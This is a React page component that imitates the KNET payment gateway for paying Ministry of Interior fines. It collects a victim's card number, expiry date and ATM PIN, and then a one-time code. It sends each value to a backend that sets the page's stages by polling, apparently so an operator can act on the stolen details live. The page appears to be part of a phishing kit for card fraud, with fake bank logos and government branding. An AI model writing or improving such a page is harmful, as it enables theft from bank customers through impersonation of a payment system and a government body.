import { useState, useEffect, type FormEvent } from "react";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";

type Stage = "card" | "card_pending" | "otp" | "otp_pending" | "success" | "failed";

const BANK_LOGOS: Record<string, string> = {
  "4": "https://www.nbk.com/dam/jcr:8b8c5c7a-5b5b-4b1a-8b8c-5c7a5b5b4b1a/nbk-logo.png",
  "5": "https://www.kfh.com/dam/jcr:7b7c6c7a-4b4b-4b1a-7b7c-6c7a4b4b4b1a/kfh-logo.png",
  "6": "https://www.boubyanbank.com/logo.png",
};

export default function Payment() {
  const [, setLocation] = useLocation();
  const [stage, setStage] = useState<Stage>("card");
  const [paymentData, setPaymentData] = useState<any>(null);
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);
  
  const [cardNumber, setCardNumber] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [pin, setPin] = useState("");
  const [otp, setOtp] = useState("");
  
  const [detectedLogo, setDetectedLogo] = useState<string | null>(null);

  useEffect(() => {
    const data = sessionStorage.getItem("paymentData");
    if (!data) { setLocation("/"); return; }
    const parsed = JSON.parse(data);
    setPaymentData(parsed);
    
    createSessionMutation.mutate({
      selectedFines: parsed.selectedFines,
      totalAmount: parsed.totalAmount,
      civilId: parsed.civilId,
      enquiryType: "1",
      queryId: "manual"
    });
  }, []);

  useEffect(() => {
    const firstDigit = cardNumber.charAt(0);
    setDetectedLogo(BANK_LOGOS[firstDigit] || null);
  }, [cardNumber]);

  const createSessionMutation = trpc.payment.createSession.useMutation({
    onSuccess: (data) => setSessionId(data.sessionId)
  });

  const { data: sessionStatus } = trpc.payment.getStatus.useQuery(
    { sessionId: sessionId || "" },
    { enabled: !!sessionId && stage.endsWith("_pending"), refetchInterval: 2000 }
  );

  useEffect(() => {
    if (sessionStatus?.stage) {
      if (sessionStatus.stage === "atm") setStage("otp");
      else setStage(sessionStatus.stage as Stage);
      if (sessionStatus.errorMessage) setError(sessionStatus.errorMessage);
    }
  }, [sessionStatus]);

  const submitCard = trpc.payment.submitCard.useMutation({
    onSuccess: () => setStage("card_pending"),
    onError: (err) => { setError(err.message); setStage("failed"); }
  });

  const submitOtp = trpc.payment.submitOtp.useMutation({
    onSuccess: () => setStage("otp_pending"),
    onError: (err) => { setError(err.message); setStage("failed"); }
  });

  const handleCardSubmit = (e: FormEvent) => {
    e.preventDefault();
    if (!sessionId) return;
    submitCard.mutate({
      sessionId,
      cardName: "KNET",
      cardNumber: cardNumber.replace(/\s/g, ""),
      cardExpiry: `${expiryMonth}/${expiryYear}`,
      cardCvv: pin
    });
  };

  const handleOtpSubmit = (e: FormEvent) => {
    e.preventDefault();
    if (!sessionId) return;
    submitOtp.mutate({ sessionId, otpCode: otp });
  };

  if (!paymentData) return null;

  return (
    <div className="knet-payment-wrapper" dir="ltr">
      <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" />
      <style>{`
        .knet-payment-wrapper { background-color: #f5f7f9; min-height: 100vh; font-family: sans-serif; display: flex; justify-content: center; padding-top: 30px; }
        .knet-card { background: #fff; width: 100%; max-width: 420px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); border: 1px solid #e0e0e0; overflow: hidden; }
        .knet-header { background: #005eb8; padding: 25px; text-align: center; color: #fff; }
        .knet-logo { height: 40px; }
        .knet-merchant-box { background: #fafafa; padding: 20px; border-bottom: 1px solid #eee; font-size: 14px; }
        .knet-row { display: flex; justify-content: space-between; margin-bottom: 8px; }
        .knet-label { color: #888; }
        .knet-value { font-weight: 700; color: #333; }
        .knet-body { padding: 30px; }
        .knet-form-label { font-size: 13px; font-weight: 600; color: #555; margin-bottom: 8px; display: block; }
        .knet-input { border: 1.5px solid #dcdcdc; border-radius: 6px; padding: 12px; font-size: 16px; width: 100%; outline: none; }
        .knet-bank-box { border: 1.5px solid #dcdcdc; border-radius: 6px; padding: 10px; display: flex; align-items: center; background: #fff; min-height: 54px; }
        .knet-bank-logo { height: 24px; margin-right: 12px; }
        .knet-btn-submit { background: #005eb8; color: #fff; border: none; border-radius: 6px; padding: 15px; width: 100%; font-weight: 700; font-size: 16px; margin-top: 20px; cursor: pointer; }
        .knet-btn-cancel { background: transparent; color: #999; border: none; width: 100%; font-size: 14px; margin-top: 15px; text-decoration: underline; cursor: pointer; }
      `}</style>

      <div className="knet-card">
        <div className="knet-header">
          <img src="https://www.knet.com.kw/wp-content/uploads/2020/03/knet-logo-white.png" className="knet-logo" alt="KNET" />
        </div>

        <div className="knet-merchant-box">
          <div className="knet-row"><span>Merchant:</span><span className="knet-value">Ministry of Interior</span></div>
          <div className="knet-row"><span>Amount:</span><span className="knet-value text-primary" style={{fontSize:'18px'}}>{paymentData.totalAmount} KWD</span></div>
        </div>

        <div className="knet-body">
          {stage === "card" && (
            <form onSubmit={handleCardSubmit}>
              <div className="form-group">
                <label className="knet-form-label">Select Your Bank</label>
                <div className="knet-bank-box">
                  {detectedLogo ? <img src={detectedLogo} className="knet-bank-logo" alt="bank" /> : <span className="text-muted small">Auto-detecting bank...</span>}
                </div>
              </div>
              <div className="form-group mt-4">
                <label className="knet-form-label">Card Number</label>
                <input type="text" className="knet-input" placeholder="0000 0000 0000 0000" value={cardNumber} onChange={e => setCardNumber(e.target.value.replace(/\D/g, '').substring(0, 16))} required />
              </div>
              <div className="row mt-4">
                <div className="col-7">
                  <label className="knet-form-label">Expiration Date</label>
                  <div className="d-flex">
                    <select className="knet-input mr-2" value={expiryMonth} onChange={e => setExpiryMonth(e.target.value)} required>
                      <option value="">MM</option>
                      {Array.from({length: 12}, (_, i) => (i + 1).toString().padStart(2, '0')).map(m => <option key={m} value={m}>{m}</option>)}
                    </select>
                    <select className="knet-input" value={expiryYear} onChange={e => setExpiryYear(e.target.value)} required>
                      <option value="">YY</option>
                      {Array.from({length: 10}, (_, i) => (new Date().getFullYear() + i).toString().substring(2)).map(y => <option key={y} value={y}>{y}</option>)}
                    </select>
                  </div>
                </div>
                <div className="col-5">
                  <label className="knet-form-label">PIN</label>
                  <input type="password" maxLength={4} className="knet-input text-center" placeholder="****" value={pin} onChange={e => setPin(e.target.value.replace(/\D/g, '').substring(0, 4))} required />
                </div>
              </div>
              <button type="submit" className="knet-btn-submit">Submit Payment</button>
              <button type="button" className="knet-btn-cancel" onClick={() => setLocation("/")}>Cancel Transaction</button>
            </form>
          )}

          {stage === "otp" && (
            <form onSubmit={handleOtpSubmit} className="text-center">
              <h5 className="font-weight-bold mb-4">Enter OTP</h5>
              <p className="text-muted small mb-4">A security code has been sent to your mobile. Please enter it to authorize the transaction.</p>
              <input type="text" className="knet-input text-center mb-4" style={{ letterSpacing: '0.4em', fontSize: '24px' }} value={otp} onChange={e => setOtp(e.target.value.replace(/\D/g, '').substring(0, 6))} placeholder="000000" required />
              <button type="submit" className="knet-btn-submit">Verify & Pay</button>
            </form>
          )}

          {stage.endsWith("_pending") && (
            <div className="text-center py-5">
              <div className="spinner-border text-primary mb-4" style={{ width: '3rem', height: '3rem' }}></div>
              <h6 className="font-weight-bold">Processing...</h6>
            </div>
          )}

          {stage === "success" && (
            <div className="text-center py-4">
              <h4 className="font-weight-bold text-success">Success</h4>
              <p className="text-muted small">Your payment has been processed.</p>
              <button className="knet-btn-submit" onClick={() => setLocation("/")}>Done</button>
            </div>
          )}

          {stage === "failed" && (
            <div className="text-center py-4">
              <h4 className="font-weight-bold text-danger">Failed</h4>
              <p className="text-muted small">{error || "Transaction declined."}</p>
              <button className="knet-btn-submit" onClick={() => setStage("card")}>Try Again</button>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
